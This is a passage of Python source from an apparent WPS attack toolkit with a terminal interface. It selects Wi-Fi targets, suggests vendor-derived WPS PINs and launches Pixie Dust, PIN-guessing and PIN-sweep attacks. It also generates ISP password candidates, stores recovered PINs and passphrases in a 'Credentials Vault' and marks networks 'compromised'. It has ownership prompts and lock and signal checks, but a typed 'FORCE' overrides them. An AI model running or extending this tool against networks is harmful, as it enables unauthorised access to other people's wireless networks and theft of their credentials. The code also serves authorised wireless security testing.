                    label = "Pixie Dust (HIGH conf {c}%)".format(
                        c=report.get("pixie_confidence", 0)
                    )
                else:
                    label = "Pixie Dust (conf {c}%)".format(
                        c=report.get("pixie_confidence", 0)
                    )
                actions[str(next_number)] = "pixie"
                con.print("  [mn]{number}[/] {label}".format(
                    number=next_number, label=label
                ))
                next_number += 1
                offered.add("pixie")
        con.print("  [mn]0[/] Back")

        if not actions:
            Prompt.ask("\n[dim]No compatible action. Enter[/]")
            return

        choice = Prompt.ask(
            "Next action",
            choices=["0"] + list(actions.keys()),
            default="0",
        )
        if choice == "0":
            return
        if not Confirm.ask(
            "I confirm I own this target or have explicit permission",
            default=False,
        ):
            return

        selected_action = actions[choice]
        target = (report["bssid"], report["essid"])
        preset = (report["bssid"], report["essid"], report["channel"])
        if selected_action == "pmkid":
            self._capture_pmkid(preset_target=target)
        elif selected_action == "passive":
            self._capture_passive(
                preset_target=target,
                preset_channel=report["channel"],
            )
        elif selected_action == "pin_sweep":
            self._launch_attack("3", preset_target=preset)
        elif selected_action == "pixie":
            self._launch_attack("2", preset_target=preset)

    def _smart_attack(self):
        """Smart Attack - automatically selects best PIN"""
        con.clear()
        con.print(Rule("[hdr]Smart Attack[/]", style="cyan"))

        # Show networks from database for selection
        nets = self.db.get_all_networks()
        if not nets:
            con.print("[warn]No networks in database. Run a scan first.[/]")
            con.print("  [mn]1[/] - Quick scan now")
            con.print("  [mn]0[/] - Back\n")
            ch = Prompt.ask("Select", default="0")
            if ch == "1":
                self.view_scanner()
            return

        # Show networks table
        net_table(nets, "Select Target")

        con.print()
        sel = Prompt.ask("Enter # from list or BSSID", default="1")

        # Try to parse as number first
        try:
            idx = int(sel)
            if 1 <= idx <= len(nets):
                n = nets[idx - 1]
                bssid = _get_field(n, "bssid")
                essid = str(_get_field(n, "essid", "Unknown"))
                wps_ver = str(_get_field(n, "wps_version", ""))
                wps_lock = str(_get_field(n, "wps_locked", "Unknown"))
                channel = int(_get_field(n, "channel", 0))
            else:
                con.print("[err]Invalid number[/]")
                Prompt.ask("\n[dim]Enter[/]")
                return
        except ValueError:
            # User entered BSSID directly
            bssid = sel.strip().upper()
            if not bssid:
                return
            n = self.db.get_network(bssid)
            if n:
                essid = str(_get_field(n, "essid", "Unknown"))
                wps_ver = str(_get_field(n, "wps_version", ""))
                wps_lock = str(_get_field(n, "wps_locked", "Unknown"))
                channel = int(_get_field(n, "channel", 0))
            else:
                essid = Prompt.ask("ESSID", default="Unknown")
                wps_ver = ""
                wps_lock = "Unknown"
                channel = 0

        # Smart Attack must obey the same WPS preflight as every other path.
        if n:
            has_wps = int(_get_field(n, "has_wps", 0) or 0)
            try:
                signal = int(_get_field(n, "rssi", 0) or 0)
            except (TypeError, ValueError):
                signal = 0
            if not has_wps:
                con.print("[err]WPS was not detected. Smart Attack was not started.[/]")
                Prompt.ask("\n[dim]Enter[/]")
                return
            if wps_lock.lower() == "yes":
                con.print("[err]WPS is locked. Smart Attack was not started.[/]")
                Prompt.ask("\n[dim]Enter[/]")
                return
            if signal and signal <= -85:
                con.print("[warn]Very weak signal: {signal} dBm[/]".format(
                    signal=signal
                ))
                if not Confirm.ask("Continue despite unreliable signal?", default=False):
                    return

        iface = self.cfg.get("interface", "wlan0")
        if get_mode(iface) == "monitor":
            con.print("[warn]WPS requires managed mode. Restoring Wi-Fi...[/]")
            if not disable_monitor(iface):
                con.print("[err]Could not restore managed mode[/]")
                Prompt.ask("\n[dim]Enter[/]")
                return
            iface = "wlan0"
            self.cfg.set("interface", iface)

        # Analyze target
        analysis = analyze_target(bssid, wps_ver, wps_lock)

        con.print(f"\n  [hdr]Target Analysis[/]")
        con.print(f"  BSSID:      [inf]{bssid}[/]")
        con.print(f"  ESSID:      [inf]{essid}[/]")
        con.print(f"  Manufacturer:[warn]{analysis['manufacturer']}[/]")
        con.print(f"  Algorithm:  [cyan]{analysis['algorithm']}[/]")
        conf_style = 'ok' if analysis['confidence'] > 70 else 'warn'
        con.print(f"  Confidence: [{conf_style}]{analysis['confidence']}%[/]")
        con.print(f"  Best PIN:   [ok]{analysis['best_pin']}[/]")
        con.print(f"  WPS:        v{wps_ver}  Lock: {wps_lock}")

        if n:
            model = _get_field(n, "wps_model", "")
            device = _get_field(n, "wps_device", "")
            if model:
                con.print(f"  Model:      {str(model)}")
            if device:
                con.print(f"  Device:     {str(device)}")

        con.print(f"\n  [hdr]PIN Suggestions (top 8):[/]")
        for i, p in enumerate(analysis["pins"][:8], 1):
            conf = p.get("confidence", 0)
            cc = "ok" if conf > 70 else ("warn" if conf > 40 else "dim")
            con.print(f"    {i}. [{cc}]{p['pin']}[/] ({p['method']}) conf:{conf}%")

        con.print(f"\n  [mn]1[/] - Try best PIN first")
        con.print("  [mn]2[/] - Smart sequence (PIN → Pixie → PIN sweep)")
        con.print("  [mn]3[/] - Try specific PIN from list")
        con.print("  [mn]0[/] - Back\n")

        ch = Prompt.ask("Select", default="2")

        if ch == "0":
            return

        sid = self.db.create_session(bssid, essid, "Smart Attack")
        self.db.log("attack", "attack", f"Smart attack on {essid} ({bssid})", "warn")

        def output_cb(line):
            ll = line.lower()
            if "[+]" in line or "wps pin:" in ll or "wpa psk:" in ll:
                con.print(f"[ok]{line}[/]")
            elif "[-]" in line or "locked" in ll or "nack" in ll or "m2d" in ll:
                con.print(f"[warn]{line}[/]")
            elif "[!]" in line or "error" in ll:
                con.print(f"[err]{line}[/]")
            elif "smart" in ll or "step" in ll or "analysis" in ll:
                con.print(f"[hdr]{line}[/]")
            elif "trying pin" in ll or "scanning" in ll:
                con.print(f"[inf]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")

        skip_pins = self.db.get_attempted_wps_pins(bssid)
        if skip_pins:
            con.print("[dim]Resume database: {count} PINs already tried[/]".format(
                count=len(skip_pins)
            ))

        if ch == "1":
            con.print(f"\n[hdr]Trying best PIN: {analysis['best_pin']}[/]\n")
            result = run_wps_attack(
                iface,
                "pin",
                bssid,
                analysis["best_pin"],
                output_cb,
            )
        elif ch == "2":
            con.print("\n[hdr]Smart Attack Sequence[/]\n")
            result = run_smart_attack(
                iface,
                bssid,
                wps_ver,
                wps_lock,
                output_cb,
                skip_pins=skip_pins,
            )
        elif ch == "3":
            pin_idx = IntPrompt.ask("PIN # from list", default=1)
            if 1 <= pin_idx <= len(analysis["pins"]):
                selected_pin = analysis["pins"][pin_idx-1]["pin"]
                con.print(f"\n[hdr]Trying: {selected_pin}[/]\n")
                result = run_wps_attack(
                    iface,
                    "pin",
                    bssid,
                    selected_pin,
                    output_cb,
                )
            else:
                con.print("[err]Invalid selection[/]")
                Prompt.ask("\n[dim]Enter[/]")
                return
        else:
            result = run_wps_attack(
                iface,
                "pin",
                bssid,
                analysis["best_pin"],
                output_cb,
            )

        for attempt in result.get("attempts", []):
            self.db.record_wps_attempt(
                bssid=bssid,
                pin=attempt.get("pin", ""),
                status=attempt.get("status", "unknown"),
                response=attempt.get("response", ""),
                duration=attempt.get("duration", 0),
                session_id=sid,
            )

        verified_pin, verified_psk = _credential_fields_for_result(result)

        # Save results
        end_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.db.update_session(
            sid,
            status=result["status"],
            end_time=end_time,
            pin_found=verified_pin or "",
            psk_found=verified_psk or "",
            log_path=result["log_file"],
        )

        _print_attack_result(result)
        if hasattr(self, "_save_attack_artifacts"):
            self._save_attack_artifacts(
                bssid, essid, atype if "atype" in locals() else "attack", result,
                assessment=assess_report if "assess_report" in locals() else None,
                playbook=playbook if "playbook" in locals() else None,
            )

        if result["status"] == "success" and verified_psk:
            self.db.execute("UPDATE networks SET status='compromised' WHERE bssid=?", (bssid,))
            self.db.add_credential(
                bssid,
                essid,
                verified_pin,
                verified_psk,
                "Smart Attack",
            )
            self.db.log(
                "success",
                "attack",
                "Credentials: PIN={pin} PSK={psk}".format(
                    pin=verified_pin or "",
                    psk=verified_psk,
                ),
                "ok",
            )
            con.print("[ok]CREDENTIALS SAVED![/]")

        Prompt.ask("\n[dim]Enter[/]")

    def _get_target(self, ch):
        if ch == "4":
            tgts = self.db.get_targets()
            if not tgts:
                con.print("[warn]No targets.[/]")
                return None, None, None
            net_table(tgts, "Select Target")
            idx = IntPrompt.ask("Target #", default=1)
            if 1 <= idx <= len(tgts):
                t = tgts[idx-1]
                return str(_get_field(t, "bssid")), str(_get_field(t, "essid", "Hidden")), int(_get_field(t, "channel", 0))
            return None, None, None
        else:
            bssid = Prompt.ask("Target BSSID").strip().upper()
            if not bssid:
                return None, None, None
            n = self.db.get_network(bssid)
            if n:
                return bssid, str(_get_field(n, "essid", "Hidden")), int(_get_field(n, "channel", 0))
            essid = Prompt.ask("ESSID", default="Unknown")
            channel = IntPrompt.ask("Channel", default=0)
            return bssid, essid, channel


    def _save_attack_artifacts(self, bssid, essid, action, result, assessment=None, playbook=None):
        """Store candidate PIN + evidence JSON + lab note."""
        try:
            st = result.get("status") if isinstance(result, dict) else ""
            if st == "pixie_pin_unverified":
                cpin = result.get("pin") or result.get("pixie_pin") or result.get("attempted_pin")
                if cpin:
                    self.db.save_candidate_pin(
                        bssid, cpin, essid=essid, source="pixie_offline",
                        confidence=85, notes="PSK not verified yet",
                    )
                    con.print("[ok]Candidate PIN stored (unverified).[/]")
            elif st == "success" and result.get("pin") and result.get("psk"):
                try:
                    self.db.mark_candidate_verified(bssid, result.get("pin"), result.get("psk"))
                except Exception:
                    pass
            ev = write_attack_evidence(
                bssid, essid, action, result=result,
                assessment=assessment, playbook=playbook,
            )
            try:
                self.db.save_evidence_index(bssid, essid, action, st, ev)
            except Exception:
                pass
            note = write_lab_note_md(ev)
            if note:
                con.print("[dim]Lab note: {p}[/]".format(p=note))
            con.print("[dim]Evidence: {p}[/]".format(p=ev))
        except Exception as exc:
            con.print("[dim]Evidence save skipped: {e}[/]".format(e=str(exc)))

    def _launch_attack(self, ch, preset_target=None):
        con.clear()
        con.print(Rule("[hdr]Launch Attack[/]", style="cyan"))

        if preset_target:
            bssid, essid, channel = preset_target
            bssid = str(bssid).upper()
            essid = str(essid)
            try:
                channel = int(channel)
            except (TypeError, ValueError):
                channel = 0
        elif ch == "5":
            # Attack from targets
            tgts = self.db.get_targets()
            if not tgts:
                con.print("[warn]No targets. Add targets first (menu 2).[/]")
                Prompt.ask("\n[dim]Enter[/]")
                return
            net_table(tgts, "Select Target")
            sel = Prompt.ask("Enter # from list or BSSID", default="1")
            try:
                idx = int(sel)
                if 1 <= idx <= len(tgts):
                    t = tgts[idx - 1]
                    bssid = t["bssid"]
                    essid = str(_get_field(t, "essid", "Unknown"))
                    channel = _get_field(t, "channel", 0)
                else:
                    con.print("[err]Invalid[/]")
                    Prompt.ask("\n[dim]Enter[/]")
                    return
            except ValueError:
                bssid = sel.strip().upper()
                n = self.db.get_network(bssid)
                if n:
                    essid = str(_get_field(n, "essid", "Unknown"))
                    channel = int(_get_field(n, "channel", 0))
                else:
                    essid = Prompt.ask("ESSID", default="Unknown")
                    channel = 0
        else:
            # Show all networks for selection
            nets = self.db.get_all_networks()
            if nets:
                net_table(nets, "Select Target")
                sel = Prompt.ask("Enter # from list or BSSID", default="1")
                try:
                    idx = int(sel)
                    if 1 <= idx <= len(nets):
                        n = nets[idx - 1]
                        bssid = _get_field(n, "bssid")
                        essid = str(_get_field(n, "essid", "Unknown"))
                        channel = int(_get_field(n, "channel", 0))
                    else:
                        con.print("[err]Invalid[/]")
                        Prompt.ask("\n[dim]Enter[/]")
                        return
                except ValueError:
                    bssid = sel.strip().upper()
                    n = self.db.get_network(bssid)
                    if n:
                        essid = str(_get_field(n, "essid", "Unknown"))
                        channel = int(_get_field(n, "channel", 0))
                    else:
                        essid = Prompt.ask("ESSID", default="Unknown")
                        channel = 0
            else:
                bssid = Prompt.ask("BSSID").strip().upper()
                if not bssid:
                    return
                n = self.db.get_network(bssid)
                essid = str(_get_field(n, "essid", "Unknown")) if n else Prompt.ask("ESSID", default="Unknown")
                channel = int(_get_field(n, "channel", 0)) if n else 0
        if not bssid:
            Prompt.ask("\n[dim]Enter[/]")
            return

        # Show vulnerability analysis. Database rows are sqlite3.Row objects,
        # so access every network field through _get_field instead of .get().
        n = self.db.get_network(bssid)
        if n:
            pins = suggest_pins(bssid)[:8]
            model = str(_get_field(n, "wps_model", "") or "")
            device = str(_get_field(n, "wps_device", "") or "")
            wps_version = str(_get_field(n, "wps_version", "") or "")
            wps_locked = str(_get_field(n, "wps_locked", "Unknown") or "Unknown")
            has_wps = int(_get_field(n, "has_wps", 0) or 0)
            try:
                signal = int(_get_field(n, "rssi", 0) or 0)
            except (TypeError, ValueError):
                signal = 0

            vulnerability = _vulnerability_label(model, device)

            con.print("\n  [hdr]Vulnerability Analysis[/]")
            con.print("  ESSID:  [inf]{essid}[/]".format(essid=essid))
            con.print("  BSSID:  [inf]{bssid}[/]".format(bssid=bssid))
            con.print("  Model:  {model}".format(model=model or "Unknown"))
            con.print("  Device: {device}".format(device=device or "Unknown"))
            con.print("  WPS:    v{version}  Lock: {lock}".format(
                version=wps_version,
                lock=wps_locked,
            ))

            if not has_wps:
                con.print("[err]This scan did not detect WPS on the target.[/]")
                Prompt.ask("\n[dim]Enter[/]")
                return
            if wps_locked.lower() == "yes":
                con.print("[err]WPS is locked. Online PIN attempts were not started.[/]")
                Prompt.ask("\n[dim]Enter[/]")
                return
            if signal and signal <= -85:
                con.print(
                    "[warn]Very weak signal ({signal} dBm). WPS exchanges may time out "
                    "or cause false Wrong PIN results.[/]".format(signal=signal)
                )
                if not Confirm.ask("Continue despite weak signal?", default=False):
                    return

            if vulnerability["status"] == "known_vulnerable":
                con.print("  Status: [ok]Known vulnerable: {match}[/]".format(
                    match=vulnerability["match"]
                ))
            elif vulnerability["status"] == "vendor_heuristic":
                con.print(
                    "  Status: [warn]Vendor heuristic — vulnerability not confirmed: {match}[/]".format(
                        match=vulnerability["match"]
                    )
                )
            if pins:
                con.print("  [ok]Suggested PINs:[/]")
                for index, pin_info in enumerate(pins[:6], 1):
                    conf = pin_info.get("confidence", "?")
                    con.print("    {index}. [ok]{pin}[/] ({method}, conf {conf})".format(
                        index=index,
                        pin=pin_info["pin"],
                        method=pin_info["method"],
                        conf=conf,
                    ))
        else:
            pins = suggest_pins(bssid)[:5]
            signal = 0
            wps_locked = "Unknown"
            model = ""
            device = ""
            wps_version = ""
            has_wps = 1

        # Offline smart assessment (history-aware) for method gating
        assess_net = {
            "bssid": bssid,
            "essid": essid,
            "channel": channel,
            "rssi": int(signal or 0),
            "has_wps": int(has_wps or 0) if n else 1,
            "wps_locked": str(wps_locked or "Unknown"),
            "wps_version": str(wps_version or "") if n else "",
            "wps_model": str(model or ""),
            "wps_device": str(device or ""),
            "encryption": str(_get_field(n, "encryption", "WPA2") or "WPA2") if n else "WPA2",
        }
        hist = history_from_db(self.db, bssid)
        assess_report = TargetAssessor(
            internal_monitor=True,
            internal_injection=False,
            history=hist,
        ).assess(assess_net)

        playbook = assess_report.get("playbook") or build_playbook(assess_net, assess_report)
        con.print("\n  [hdr]Method planner[/]")
        con.print("  Recommended: [ok]{v}[/]".format(v=assess_report.get("recommended_method")))
        con.print("  Playbook:    [inf]{v}[/]".format(v=playbook.get("label") or playbook.get("family")))
        con.print("  Primary:     {v}".format(v=playbook.get("primary")))
        con.print("  Pixie: {tier} ({conf}%)  allowed={al}".format(
            tier=str(assess_report.get("pixie_tier") or "none").upper(),
            conf=assess_report.get("pixie_confidence", 0),
            al=playbook.get("pixie_allowed"),
        ))
        if assess_report.get("modern_resistant"):
            con.print("  [warn]Modern ISP ONT: {m} — Pixie not recommended[/]".format(
                m=assess_report.get("resistant_match") or "?"
            ))
        if assess_report.get("attack_order"):
            con.print("  Order: {o}".format(
                o=" → ".join(assess_report.get("attack_order")[:5])
            ))
        for note in (playbook.get("notes") or [])[:2]:
            con.print("  [dim]• {n}[/]".format(n=note))
        for warn in (playbook.get("warnings") or [])[:2]:
            con.print("  [warn]• {w}[/]".format(w=warn))

        # ISP password candidates (offline)
        if playbook.get("family") in ("isp_ont", "isp_generic", "zte_cpe", "huawei_cpe"):
            cands = candidates_for_target(
                essid=essid,
                bssid=bssid,
                model=str(assess_net.get("wps_model") or ""),
                manufacturer=str(assess_report.get("manufacturer") or ""),
                limit=10,
            )
            if cands:
                con.print("\n  [hdr]Offline ISP password candidates[/]")
                for line in format_candidates(cands, limit=8):
                    con.print("    {l}".format(l=line))
                con.print("  [dim]Heuristics only — not verified. Try via connection test / hashcat offline.[/]")

        # Attack type. Menu 4 is always a specific PIN; menu 5 uses the
        # smart best-PIN path for a saved target.
        atype_map = {
            "2": "pixie",
            "3": "bruteforce",
            "4": "pin",
            "5": "smart",
        }
        atype = atype_map.get(ch, "pixie")

        # Hard safety gates (signal / lock / pixie history / planner)
        gate = gate_online_wps(
            rssi=assess_net.get("rssi") or signal,
            wps_locked=assess_net.get("wps_locked") or wps_locked,
            has_wps=bool(int(assess_net.get("has_wps") or has_wps or 0)),
            action=atype,
            history=hist,
            modern_resistant=bool(assess_report.get("modern_resistant")),
            pixie_tier=str(assess_report.get("pixie_tier") or "none"),
        )
        con.print("\n  [hdr]Safety gate[/]")
        con.print("  {sum}".format(sum=gate.get("summary")))
        for reason in (gate.get("reasons") or [])[:4]:
            style = "warn" if (not gate.get("allowed") or gate.get("force_required")) else "dim"
            con.print("  [{s}]• {r}[/]".format(s=style, r=reason))
        if atype == "pixie" and not gate.get("allowed"):
            con.print("[ok]Better path:[/] {rec}".format(
                rec=assess_report.get("recommended_method")
            ))
        if not gate.get("allowed") or (gate.get("force_required") and atype in ("pixie", "bruteforce", "pin", "smart")):
            if not Confirm.ask(
                "Force this online action despite warnings?",
                default=False,
            ):
                return
            if self.cfg.get("require_force_phrase", True) and not gate.get("allowed"):
                phrase = Prompt.ask("Type FORCE to continue", default="")
                if str(phrase).strip().upper() != "FORCE":
                    con.print("[err]Cancelled — FORCE not confirmed.[/]")
                    return

        pin = None
        if atype == "pin":
            default_pin = pins[0]["pin"] if pins else ""
            pin = Prompt.ask("PIN", default=default_pin)

        pin_name = "PIN ({pin})".format(pin=pin)
        names = {
            "pixie": "Pixie Dust",
            "bruteforce": "Suggested PIN Sweep",
            "pin": pin_name,
            "smart": "Smart Best-PIN Test",
        }
        aname = names.get(atype, "Unknown")

        attack_iface = self.cfg.get("interface", "wlan0")
        if get_mode(attack_iface) == "monitor":
            con.print("[warn]WPS requires managed mode. Restoring Wi-Fi...[/]")
            if not disable_monitor(attack_iface):
                con.print("[err]Could not restore managed mode[/]")
                Prompt.ask("\n[dim]Enter[/]")
                return
            attack_iface = "wlan0"
            self.cfg.set("interface", attack_iface)

        con.print("\n[hdr]{name} on {essid} ({bssid})[/]".format(
            name=aname,
            essid=essid,
            bssid=bssid,
        ))
        con.print("  Method: [ok]WPS Engine[/]  Interface: [inf]{iface}[/]".format(
            iface=attack_iface
        ))
        if atype == "bruteforce":
            max_pins = int(assess_report.get("max_online_pins") or 3)
            con.print(
                "[warn]Controlled mode: high-priority PINs only "
                "(budget ~{n}). Not an exhaustive 11k attack.[/]".format(n=max_pins)
            )

        _def_confirm = not (not gate.get("allowed") or gate.get("force_required") or (atype == "pixie" and str(assess_report.get("pixie_tier")) in ("none", "low")))
        if not Confirm.ask("\n  Start authorized test?", default=_def_confirm):
            return

        # Create session
        sid = self.db.create_session(bssid, essid, aname)
        self.db.log("attack", "attack", f"{aname} on {essid} ({bssid})", "warn")

        con.print(f"\n[warn]Attack running... (Ctrl+C to stop)[/]\n")

        def output_cb(line):
            ll = line.lower()
            if "[+]" in line or "wps pin:" in ll or "wpa psk:" in ll:
                con.print(f"[ok]{line}[/]")
            elif "[-]" in line or "locked" in ll or "nack" in ll or "m2d" in ll:
                con.print(f"[warn]{line}[/]")
            elif "[!]" in line or "error" in ll:
                con.print(f"[err]{line}[/]")
            elif "trying pin" in ll or "scanning" in ll:
                con.print(f"[inf]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")

        skip_pins = set()
        if atype == "bruteforce":
            skip_pins = self.db.get_attempted_wps_pins(bssid)
            if skip_pins:
                con.print("[dim]Resume database: {count} PINs already tried[/]".format(
                    count=len(skip_pins)
                ))

        result = run_wps_attack(
            attack_iface,
            atype,
            bssid,
            pin,
            output_cb,
            skip_pins=skip_pins,
        )

        for attempt in result.get("attempts", []):
            self.db.record_wps_attempt(
                bssid=bssid,
                pin=attempt.get("pin", ""),
                status=attempt.get("status", "unknown"),
                response=attempt.get("response", ""),
                duration=attempt.get("duration", 0),
                session_id=sid,
            )

        verified_pin, verified_psk = _credential_fields_for_result(result)

        # Save results
        end_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.db.update_session(
            sid,
            status=result["status"],
            end_time=end_time,
            pin_found=verified_pin or "",
            psk_found=verified_psk or "",
            log_path=result["log_file"],
        )

        _print_attack_result(result)
        if hasattr(self, "_save_attack_artifacts"):
            self._save_attack_artifacts(
                bssid, essid, atype if "atype" in locals() else "attack", result,
                assessment=assess_report if "assess_report" in locals() else None,
                playbook=playbook if "playbook" in locals() else None,
            )

        if result["status"] == "success" and verified_psk:
            self.db.execute("UPDATE networks SET status='compromised' WHERE bssid=?", (bssid,))
            self.db.add_credential(
                bssid,
                essid,
                verified_pin,
                verified_psk,
                aname,
            )
            self.db.log(
                "success",
                "attack",
                "Credentials found: PIN={pin} PSK={psk}".format(
                    pin=verified_pin or "",
                    psk=verified_psk,
                ),
                "ok",
            )
            con.print("[ok]CREDENTIALS SAVED![/]")

        Prompt.ask("\n[dim]Enter[/]")



    def _show_history(self):
        con.clear()
        con.print(Rule("[hdr]Attack History[/]", style="cyan"))
        sessions = self.db.get_sessions(30)
        if not sessions:
            con.print("[warn]No history.[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return
        t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan",
                  title="[hdr]History[/]")
        t.add_column("ID", width=4)
        t.add_column("ESSID")
        t.add_column("BSSID", min_width=17)
        t.add_column("Type")
        t.add_column("Status")
        t.add_column("PIN")
        t.add_column("PSK")
        for s in sessions:
            sc = "ok" if s["status"] in ("success","completed") else (
                "warn" if s["status"] == "running" else "dim")
            t.add_row(str(s["id"]), s["essid"] or "-", s["bssid"] or "-",
                      s["attack_type"] or "-", f"[{sc}]{s['status']}[/]",
                      s["pin_found"] or "-", s["psk_found"] or "-")
        con.print(t)
        Prompt.ask("\n[dim]Enter[/]")



    # ═══════════════════════════════════════
    # VIEW: LIVE MONITOR
    # ═══════════════════════════════════════
    def view_live(self):
        con.print("[dim]Live Dashboard - Ctrl+C to exit[/]\n")
        try:
            with Live(console=con, refresh_per_second=1, screen=True) as live:
                while True:
                    uptime = int(time.time() - self.start_time)
                    ut = "{:02d}:{:02d}:{:02d}".format(uptime//3600, (uptime%3600)//60, uptime%60)
                    cpu = psutil.cpu_percent(interval=0.1)
                    mem = psutil.virtual_memory()
                    disk = psutil.disk_usage("/")
                    st = self.db.get_stats()

                    layout = Layout()
                    layout.split_column(
                        Layout(name="h", size=3),
                        Layout(name="b"),
                        Layout(name="f", size=3))
                    layout["b"].split_row(
                        Layout(name="l", ratio=2),
                        Layout(name="r", ratio=1))
                    layout["l"].split_column(
                        Layout(name="stats", size=8),
                        Layout(name="log"))
                    layout["r"].split_column(
                        Layout(name="sys", size=10),
                        Layout(name="atk"))

                    layout["h"].update(Panel(
                        f"[hdr]WPS Toolkit Live[/]  |  {ut}  |  {datetime.now():%H:%M:%S}",
                        style="cyan"))

                    tx = Text()
                    tx.append(f"  Networks: {st['total']}  ", style="bold cyan")
                    tx.append(f"WPS: {st['wps']}  ", style="bold green")
                    tx.append(f"Open: {st['wps_open']}  ", style="green")
                    tx.append(f"Locked: {st['wps_locked']}  ", style="red")
                    tx.append(f"Targets: {st['targets']}  ", style="yellow")
                    tx.append(f"Compromised: {st['compromised']}", style="bold green")
                    layout["stats"].update(Panel(tx, title="Stats", border_style="cyan"))

                    acts = self.db.get_log(8)
                    at = Text()
                    for a in acts:
                        sev_c = {"success":"green","warning":"yellow",
                                "error":"red","info":"dim"}.get(a["severity"], "dim")
                        at.append(f"  {str(a['timestamp'])[:19]} {a['message']}\n", style=sev_c)
                    if not acts:
                        at.append("  No activity", style="dim")
                    layout["log"].update(Panel(at, title="Activity", border_style="dim"))

                    cc = "green" if cpu < 60 else ("yellow" if cpu < 85 else "red")
                    mc = "green" if mem.percent < 60 else ("yellow" if mem.percent < 85 else "red")
                    sy = Text()
                    sy.append(f"  CPU:  {cpu}%\n", style=cc)
                    sy.append(f"  RAM:  {mem.percent}% ({mem.used//(1024**2)}MB/{mem.total//(1024**2)}MB)\n", style=mc)
                    sy.append(f"  Disk: {disk.percent}%\n")
                    layout["sys"].update(Panel(sy, title="System", border_style="green"))

                    active = self.db.get_active_sessions()
                    ak = Text()
                    if active:
                        for a in active:
                            ak.append(f"  {a['attack_type']}: {a['essid']}\n", style="red")
                    else:
                        ak.append("  No active attacks", style="dim")
                    layout["atk"].update(Panel(ak, title="Attacks", border_style="red"))

                    layout["f"].update(Panel("[dim]Ctrl+C to exit[/]", style="dim"))
                    live.update(layout)
                    time.sleep(1)
        except KeyboardInterrupt:
            pass

    # ═══════════════════════════════════════
    # VIEW: CREDENTIALS
    # ═══════════════════════════════════════
    def view_creds(self):
        while True:
            con.clear()
            con.print(Rule("[hdr]Credentials Vault[/]", style="cyan"))
            creds = self.db.get_credentials()
            con.print(f"\n  Stored: [inf]{len(creds)}[/]")
            con.print("\n  [mn]1[/] View All  [mn]2[/] Search  [mn]3[/] Suspicious WPS Entries  [mn]0[/] Back\n")

            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                if not creds:
                    con.print("[warn]No credentials.[/]")
                else:
                    t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
                    t.add_column("#", width=3)
                    t.add_column("ESSID")
                    t.add_column("BSSID", min_width=17)
                    t.add_column("PIN", style="green")
                    t.add_column("PSK", style="green")
                    t.add_column("Method")
                    t.add_column("Time")
                    for i, c in enumerate(creds, 1):
                        t.add_row(str(i), c["essid"] or "-", c["bssid"],
                                  c["pin"] or "-", c["psk"] or "-",
                                  c["method"] or "-", str(c["captured_at"])[:16])
                    con.print(t)
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "2":
                b = Prompt.ask("BSSID").upper()
                res = self.db.fetch_all("SELECT * FROM credentials WHERE bssid=?", (b,))
                for c in res:
                    con.print(f"  {c['essid']} PIN:{c['pin']} PSK:{c['psk']}")
                if not res:
                    con.print("[warn]Not found[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "3":
                suspicious = self.db.get_suspicious_wps_credentials()
                if not suspicious:
                    con.print("[ok]No suspicious legacy WPS credential rows found.[/]")
                    Prompt.ask("\n[dim]Enter[/]")
                    continue
                t = Table(box=box.ROUNDED, show_header=True, header_style="bold yellow")
                t.add_column("ID", width=4)
                t.add_column("ESSID")
                t.add_column("BSSID", min_width=17)
                t.add_column("PIN", style="yellow")
                t.add_column("Method")
                t.add_column("Time")
                for row in suspicious:
                    t.add_row(
                        str(row["id"]),
                        row["essid"] or "-",
                        row["bssid"] or "-",
                        row["pin"] or "-",
                        row["method"] or "-",
                        str(row["captured_at"])[:16],
                    )
                con.print(t)
                con.print("[warn]These rows contain a WPS PIN but no PSK and may be legacy false positives.[/]")
                if Confirm.ask("Delete all suspicious rows listed above?", default=False):
                    deleted = self.db.delete_credentials([row["id"] for row in suspicious])
                    con.print("[ok]Deleted {count} rows[/]".format(count=deleted))
                Prompt.ask("\n[dim]Enter[/]")

    # ═══════════════════════════════════════
    # VIEW: REPORTS
    # ═══════════════════════════════════════
    def view_reports(self):
        while True:
            con.clear()
            con.print(Rule("[hdr]Reports & Statistics[/]", style="cyan"))
            con.print("\n  [mn]1[/] Overview  [mn]2[/] HTML Report  [mn]3[/] Export JSON")
            con.print("  [mn]4[/] Backup DB  [mn]5[/] Recent Activity  [mn]0[/] Back\n")

            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                st = self.db.get_stats()
                intel = self.db.get_intelligence_stats()
                t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
                t.add_column("Metric", style="dim")
                t.add_column("Value", style="bold cyan")
                for k, v in st.items():
                    t.add_row(k, str(v))
                t.add_row("pin_db_version", str(intel.get("version", "unavailable")))
                t.add_row("pin_db_prefixes", str(intel.get("prefixes", 0)))
                t.add_row("pin_db_pins", str(intel.get("pins", 0)))
                try:
                    suspicious = self.db.get_suspicious_wps_credentials()
                    t.add_row("suspicious_wps_rows", str(len(suspicious)))
                except Exception:
                    pass
                con.print(Panel(t, title="Overview", border_style="cyan"))
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "2":
                with con.status("[ok]Generating...", spinner="dots"):
                    p = generate_html(self.db)
                con.print("[ok]Saved: {path}[/]".format(path=p))
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "3":
                with con.status("[ok]Exporting...", spinner="dots"):
                    p = export_json(self.db)
                con.print("[ok]Saved: {path}[/]".format(path=p))
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "4":
                p = self.db.backup()
                con.print("[ok]Backup: {path}[/]".format(path=p))
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "5":
                rows = self.db.get_activity_summary(30)
                if not rows:
                    con.print("[warn]No activity logged yet.[/]")
                else:
                    t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
                    t.add_column("Time", min_width=16)
                    t.add_column("Type")
                    t.add_column("Cat")
                    t.add_column("Msg")
                    for row in rows:
                        t.add_row(
                            str(row["timestamp"])[:19],
                            str(row["event_type"] or ""),
                            str(row["category"] or ""),
